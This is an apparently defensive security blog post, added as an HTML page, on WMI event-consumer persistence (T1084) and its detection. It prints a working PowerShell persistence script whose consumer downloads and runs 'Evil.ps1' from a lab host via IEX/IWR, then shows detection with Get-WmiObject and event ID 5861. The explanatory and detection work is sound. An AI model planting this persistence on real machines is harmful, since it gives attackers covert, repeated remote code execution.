@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Hackerspace, Infosec Community, IT Security, Cyber Security, Information Security, Ethical Hacking, Penetration Testing, Web Application Security, Network Security, Cryptography, Security Research, Malware Analysis, Threat Intelligence, OSINT, OPSEC, Reverse Engineering, Exploit Development, DFIR, Forensics, Incident Response, SOC, CSIRT">
+    <meta name="author" content="anonymous">
+    <title>Digital Self-Defense Lab - WMI Persistence (T1084)</title>
+    <link href="/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i" rel="stylesheet">
+    <link href="/assets/vendor/fontawesome-free/css/all.min.css" rel="stylesheet">
+    <link href="/assets/css/main.min.css" rel="stylesheet">
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <link rel="icon" type="image/png" href="/assets/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/assets/img/favicon-96x96.png" sizes="96x96">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/apple-touch-icon.png">
+  </head>
+  <body id="page-top">
+    <div class="container-fluid p-0">
+      <section class="main-section p-3 p-lg-5 d-flex align-items-center" id="blog">
+        <div class="w-100">
+          <article class="lead">
+            <header class="mb-4">
+              <h2>WMI Persistence (T1084)</h2>
+              <time datetime="2020-01-19T11:00:00+01:00" class="text-primary">Posted on 19 Jan 2020 by anonymous</time>
+            </header>
+            <div class="message">
+              Hello, DFIR Folks! In this blog post we will take a quick look at how threat actors can utilize Windows Management Instrumentation (WMI) Event Consumers to obtain persistence 
+              on a compromised windows machine, and how we as Defenders can detect these kind of malicious activities by using PowerShell and the Windows Event Log.  
+            </div>
+            <p>Now, Let’s jump straight into the first section of our blog post which is meant as a short introduction to key terms such as WMI filters, consumers<sup id="fnref:fn-MITRE_T1084"><a href="#fn:fn-MITRE_T1084" class="footnote">1</a></sup> and bindings.</p>
+            <h2 id="introduction">Introduction</h2>
+            <p>In comparision to traditional persistence mechanisms such as autostart, services, scheduled task or run keys (registry), WMI event consumers are one of the lesser know persistence mechanisms in Microsoft Windows. Even the most seasoned windows administrators will rarely get in touch with WMI event consumers. The lack of knowledge about this persistence mechanism is the main reason why WMI event consumers are so popular among threat actors.</p>
+            <p>WMI at it’s core is a database (<code class="highlighter-rouge">%windir%\System32\Wbem\Repository</code>) which contains standardized definitions of system information, which can be collected from different parts of the operating system and it’s components. This information is organized by using namespaces and classes. A big part of the class definitions in the WMI repository (database)<sup id="fnref:fn-WMI_Repository"><a href="#fn:fn-WMI_Repository" class="footnote">2</a></sup> stem from WMI providers which are responsible for monitoring and collecting information from managed objects such as processes, services or other parts of the operating system. This information is then made available by providing a uniform interface for WMI clients that can query management data from computer systems. When a WMI client queries data from a specific WMI provider<sup id="fnref:fn-WMI_Provider"><a href="#fn:fn-WMI_Provider" class="footnote">3</a></sup> class, WMI will dynamically fetch the data from the responsible WMI provider.</p>
+            <p>One of the greatest features of WMI is that it allows us to subscribe to specific system events like process starts by subscribing to event notifications<sup id="fnref:fn-Monitoring_Events"><a href="#fn:fn-Monitoring_Events" class="footnote">4</a></sup> from WMI providers such as the <code class="highlighter-rouge">Win32_Process</code><sup id="fnref:fn-Win32_Process"><a href="#fn:fn-Win32_Process" class="footnote">5</a></sup>. Whenever a specific system event occurs like for example a process start then the responsible WMI provider will be notified about this event. Subscribing to reguraly occuring system events is a good way to maintain persistence.</p>
+            <p>If you are interested in a detailed introduction to the the WMI architecture take a look at <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture">this</a>.</p>
+            <h2 id="gaining-persistence">Gaining Persistence</h2>
+            <p>What are these mysterious WMI event consumers? You might ask yourself at this point. To find an answer to this question let’s take a look at the official documentation provided by Microsoft which can be found <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/monitoring-events">here</a>.</p>
+            <p><cite>“Event consumers are applications or scripts that request notification of events, and then perform tasks when specific events occur. You can create event monitoring scripts or applications that temporarily monitor when events occur.”</cite></p>
+            <p>There are two types of event consumers, “temporary event consumers” and “permanent event consumers”<sup id="fnref:fn-Consumer_Types"><a href="#fn:fn-Consumer_Types" class="footnote">6</a></sup>. For the majority of threat actors it is desirable to maintain persistence for as long as possible, therefore it is highly likely that permanent event consumers will be used. The following PowerShell-Script named <code class="highlighter-rouge">Get-WmiPersistence.ps1</code> is an example of how PowerShell can be used to gain persistence on a compromised windows machine.</p>
+            <p>In the first part of the PowerShell-Script we use the <code class="highlighter-rouge">Set-WmiInstance</code><sup id="fnref:fn-Set_WmiInstance"><a href="#fn:fn-Set_WmiInstance" class="footnote">7</a></sup> cmdlet to instantiate the WMI class <code class="highlighter-rouge">__EventFilter</code>. In simple terms event filters are the conditions used by WMI to decide when to execute the associated event consumer (defined later in this script). As can be seen in the excerpt below the condition is defined using the WMI Query Langauge (WQL)<sup id="fnref:fn-WQL"><a href="#fn:fn-WQL" class="footnote">8</a></sup>. The presented WQL query requests that WMI check every 5 seconds for the creation of instances of the <code class="highlighter-rouge">Win32_Process</code> class, which have the name <code class="highlighter-rouge">notepad.exe</code>. If an instance of the class is created within the specified polling interval, a notification event is sent. This results in the execution of the WMI event consumer. To put it in a nutshell, everytime an instance of <code class="highlighter-rouge">notepad.exe</code> is created the WMI consumer associtated with this event filter will be executed.</p>
+            <figure class="highlight">
+              <pre><code class="language-text" data-lang="text">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+	EventNamespace = 'root/CIMV2'
+	Name = 'Malicious Filter'
+	Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "notepad.exe"'
+	QueryLanguage = 'WQL'
+}</code></pre>
+            </figure>
+            <p>In the second part of our PowerShell-Script a malicious commandline event consumer is defined which will be executed whenever the filter condition is met. There are different types of event consumers but the most popular among Threat Actors are <code class="highlighter-rouge">CommandLineEventConsumer</code> (used here) and <code class="highlighter-rouge">ActiveScriptEventConsumer</code><sup id="fnref:fn-Consumers"><a href="#fn:fn-Consumers" class="footnote">9</a></sup>. The main difference between these two is that the first one is used to launch processes while the second one is used to execute scripts.</p>
+            <p>In this example a <code class="highlighter-rouge">powershell.exe</code> process will be launched each time the filter condition is met (start of <code class="highlighter-rouge">notepad.exe</code>). The <code class="highlighter-rouge">powershell.exe</code> process uses <code class="highlighter-rouge">Invoke-WebRequest</code><sup id="fnref:fn-Invoke_WebRequest"><a href="#fn:fn-Invoke_WebRequest" class="footnote">10</a></sup> (IWR) to download a malicious PowerShell-Script named <code class="highlighter-rouge">Evil.ps1</code> from the HTTP-Server <code class="highlighter-rouge">10.0.2.15</code> controlled by the Threat Actor. The contents of the malicious PowerShell-Script <code class="highlighter-rouge">Evil.ps1</code> are evaluated by <code class="highlighter-rouge">Invoke-Expression</code><sup id="fnref:fn-Invoke_Expression"><a href="#fn:fn-Invoke_Expression" class="footnote">11</a></sup> (IEX), which leads to their immediate execution on the compromised windows machine.</p>
+            <figure class="highlight">
+              <pre><code class="language-text" data-lang="text">$Command = 'powershell.exe -Command IEX (IWR http://10.0.2.15:1337/Evil.ps1)'
+
+$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+	Name = 'Malicious Consumer'
+	CommandLineTemplate = $Command
+}</code></pre>
+            </figure>
+            <p>In the last part of the PowerShell-Script <code class="highlighter-rouge">Get-WmiPersistence.ps1</code> the event filter and the event consumer are bind together. Which creates the necessery associtation between those two instances:</p>
+            <figure class="highlight">
+              <pre><code class="language-text" data-lang="text">Set-WmiInstance -Name root\subscription -Class __FilterToConsumerBinding -Arguments @{
+	Filter = $Filter
+	Consumer = $Consumer
+}</code></pre>
+            </figure>
+            <p>If you would like to experiment a little by yourself the complete PowerShell-Script <code class="highlighter-rouge">Get-WmiPersistence.ps1</code> can be found <a href="/assets/uploads/2020/01/post1/files/Get-WmiPersistence.ps1">here</a>.</p>
+            <h2 id="execution-of-notepadexe">Execution of notepad.exe</h2>
+            <p>As soon as the victim starts a new <code class="highlighter-rouge">notepad.exe</code> process the WMI filter gets notified about this event and the associated WMI consumer gets executed.
+              This leads to the execution of the PowerShell command definied in the commandline event consumer (<code class="highlighter-rouge">powershell.exe -Command IEX (IWR http://10.0.2.15:1337/Evil.ps1)</code>). Please also note that commandline event consumers are executed by the parent process <code class="highlighter-rouge">WmiPrvSE.exe</code> as can be seen in Figure 1. In comparison to commandline event consumers, active script event consumers get executed by the process <code class="highlighter-rouge">scrcons.exe</code>.</p>
+            <p><img src="/assets/uploads/2020/01/post1/images/1.png" alt="Figure 1: Process Tree" title="Process Tree" /></p>
+            <p>On the attackers side the execution of the PowerShell command definied in the commandline event consumer results in a HTTP-Request from the compromised windows machine as shown in Figure 2. The requested ressource <code class="highlighter-rouge">Evil.ps1</code> gets transfered to the victims machine, where it is executed immediately.</p>
+            <p><img src="/assets/uploads/2020/01/post1/images/2.png" alt="Figure 2: HTTP-Request" title="HTTP-Request" /></p>
+            <p>The contents of <code class="highlighter-rouge">Evil.ps1</code> are left to the imagination of the reader ;-).</p>
+            <h2 id="detecting-wmi-persistence">Detecting WMI Persistence</h2>
+            <p>The easiest way to check if there are malicious WMI consumers installed on a system is to use the PowerShell cmdlet <code class="highlighter-rouge">Get-WmiObject</code><sup id="fnref:fn-Get_WmiObject"><a href="#fn:fn-Get_WmiObject" class="footnote">12</a></sup>. This cmdlet allows us to query the <code class="highlighter-rouge">root\Subscription</code> namespace for instances of the class <code class="highlighter-rouge">CommandLineEventConsumer</code>. The regex shown in Figure 3 is used to filter for commandline event consumers which indicate malicious PowerShell usage. As presented in Figure 3 we were able to locate the malicious commandline event consumer installed previously with the help of the PowerShell-Script <code class="highlighter-rouge">Get-WmiPersistence.ps1</code>.</p>
+            <p><code class="highlighter-rouge">Get-WmiObject -Namespace root\Subscription -Class CommandLineEventConsumer | Where CommandLineTemplate -iMatch "(http(s)?\:|\.ps1|iex|iwr|webclient|([a-z]{3,}\-[a-z]{3,} ))"</code></p>
+            <p><img src="/assets/uploads/2020/01/post1/images/3.png" alt="Figure 3: Get-WmiObject" title="Get-WmiObject" /></p>
+            <p>Depending on the logging capabilites available in your organization another great way to detect malicious WMI consumers is the use of event id 5861 from the <code class="highlighter-rouge">Microsoft-Windows-WMI-Activity</code> log. In the exmaple below event id 5861 informs us about the creation of a permant commandline event consumer named <code class="highlighter-rouge">Malicious Consumer</code>, with a <code class="highlighter-rouge">CommandLineTemplate</code> value of <code class="highlighter-rouge">powershell.exe -Command IEX (IWR http://10.0.2.15:1337/Evil.ps1)</code>.</p>
+            <p><img src="/assets/uploads/2020/01/post1/images/4.png" alt="Figure 4: Event ID 5861" title="Event ID 5861" /></p>
+            <p>Looks familiar right? ;-).</p>
+            <h2 id="final-thoughts">Final Thoughts</h2>
+            <p>The lack of knowledge about WMI consumers and the resulting blind spot in the detection capabilities of many organizations is the reason why threat actors such as Cozy Bear or Turla tend to use WMI for persistence purposes. Since Microsoft provides excellent logging capabilities to detect malicious WMI activity there is no more execuse for not being able to detect these kinds of attacks.</p>
+            <p>If your are interestend in learning more about malicious WMI activity and how to detect it you should definitely check out the following two blog posts <a href="https://www.darkoperator.com/blog/2017/10/14/basics-of-tracking-wmi-activity">“Basics of Tracking WMI Activity”</a> by <a href="https://twitter.com/carlos_perez">@Carlos_Perez</a> and <a href="https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/">“Following the trace of WMI Backdoors &amp; other nastiness”</a> by <a href="https://twitter.com/darkquassar">@darkQuassar</a>.</p>
+            <hr />
+            <p>Want to see something else added? <a href="https://github.com/digital-selfdefense-net/digital-selfdefense-net.github.io/issues/new">Open an issue.</a></p>
+            <div class="footnotes">
+              <ol>
+                <li id="fn:fn-MITRE_T1084">
+                  <p><a href="https://attack.mitre.org/techniques/T1084/">Windows Management Instrumentation Event Subscription</a> <a href="#fnref:fn-MITRE_T1084" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-WMI_Repository">
+                  <p><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture">WMI Repository</a> <a href="#fnref:fn-WMI_Repository" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-WMI_Provider">
+                  <p><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-providers">WMI Providers</a> <a href="#fnref:fn-WMI_Provider" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-Monitoring_Events">
+                  <p><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/monitoring-events">Monitoring Events</a> <a href="#fnref:fn-Monitoring_Events" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-Win32_Process">
+                  <p><a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process">Win32_Process</a> <a href="#fnref:fn-Win32_Process" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-Consumer_Types">
+                  <p><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event">WMI Consumer Types</a> <a href="#fnref:fn-Consumer_Types" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-Set_WmiInstance">
+                  <p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-wmiinstance?view=powershell-5.1">Set-WmiInstance</a> <a href="#fnref:fn-Set_WmiInstance" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-WQL">
+                  <p><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi">WMI Query Langauge</a> <a href="#fnref:fn-WQL" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-Consumers">
+                  <p><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/monitoring-and-responding-to-events-with-standard-consumers">Consumers</a> <a href="#fnref:fn-Consumers" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-Invoke_WebRequest">
+                  <p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7">Get-WmiObject</a> <a href="#fnref:fn-Invoke_WebRequest" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-Invoke_Expression">
+                  <p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7">Invoke-Expression</a> <a href="#fnref:fn-Invoke_Expression" class="reversefootnote">&#8617;</a></p>
+                </li>
+                <li id="fn:fn-Get_WmiObject">
+                  <p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1">Get-WmiObject</a> <a href="#fnref:fn-Get_WmiObject" class="reversefootnote">&#8617;</a></p>
+                </li>
+              </ol>
+            </div>
+            <footer>
+              <aside class="mt-5">
+                <h3>Related posts</h3>
+                <ul>
+                  <li>
+                    <a href="/2019/11/30/Battlefield-Malware-Analysis.html">
+                      Battlefield Malware Analysis (Part 1)
+                      <small><time class="text-primary" datetime="2019-11-30T11:00:02+01:00">30 Nov 2019</time></small>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/2019/11/30/Do-It-Yourself-Privacy-Phone.html">
+                      Do it yourself Privacy Phone
+                      <small><time class="text-primary" datetime="2019-11-30T11:00:01+01:00">30 Nov 2019</time></small>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="/2019/11/30/Hello-World.html">
+                      Hello, World!
+                      <small><time class="text-primary" datetime="2019-11-30T11:00:00+01:00">30 Nov 2019</time></small>
+                    </a>
+                  </li>
+                </ul>
+              </aside>
+              <hr class="m-2">
+              <div class="pagination-wrapper">
+                <div class="pagination">
+                  <a class="pagination-step" href="/">Back home</a>
+                  <a class="pagination-step" href="/blog/">More posts</a>
+                </div>
+              </div>
+            </footer>
+          </article>
+        </div>
+      </section>
+    </div>
+    <div class="container-fluid p-0">
+      <footer class="global-footer">
+        <p class="m-0 text-center text-white">Copyright &copy; 2020, Digital Self-Defense Lab</p>
+      </footer>
+    </div>
+    <script src="/assets/vendor/jquery/jquery.min.js"></script>
+    <script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="/assets/vendor/jquery-easing/jquery.easing.min.js"></script>
+    <script src="/assets/js/main.min.js"></script>
+  </body>
+</html>
